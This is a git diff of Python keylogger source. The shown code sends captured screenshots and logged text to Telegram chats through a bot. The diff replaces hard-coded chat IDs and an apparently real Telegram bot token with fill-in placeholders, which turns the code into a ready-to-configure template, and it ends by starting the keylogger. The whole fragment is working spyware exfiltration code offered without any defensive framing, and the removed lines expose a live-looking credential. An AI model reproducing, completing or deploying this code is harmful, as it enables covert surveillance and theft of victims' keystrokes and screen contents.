@@ -89,9 +89,8 @@ class Keylogger:
 		bot = telegram.Bot(token=self.token)
 		async with bot:
 			try:
-				await bot.send_photo(chat_id=-4130010526,photo = open(path, 'rb'))
-				#-4114199486
-				await bot.send_photo(chat_id=-4114199486,photo = open(path, 'rb'))
+				await bot.send_photo(chat_id=YOUR_CHAT_ID_HERE,photo = open(path, 'rb'))
+				await bot.send_photo(chat_id=YOUR_CHAT_ID_HERE,photo = open(path, 'rb'))
 				print("sent ", path)
 			except FileNotFoundError or telegram.error.BadRequest:
 				pass
@@ -99,8 +98,8 @@ class Keylogger:
 	async def send_bot(self,message):	
 		bot = telegram.Bot(token=self.token)
 		async with bot:
-			await bot.send_message(chat_id=-4130010526,text=message)
-			await bot.send_message(chat_id=-4114199486,text=message)
+			await bot.send_message(chat_id=YOUR_CHAT_ID_HERE,text=message)
+			await bot.send_message(chat_id=YOUR_CHAT_ID_HERE,text=message)
 			print("sent ",message)			
 
 	async def start(self):
@@ -114,5 +113,5 @@ class Keylogger:
 		
 
 
-my_keylogger = Keylogger(30,"6541175839:AAEdVSOXC5uGSr8CnnWHMnv_JhswKbbW5JY")
+my_keylogger = Keylogger(30,"YOUR_TELEGRAM_BOT_TOKEN_HERE")
 asyncio.run(my_keylogger.start())
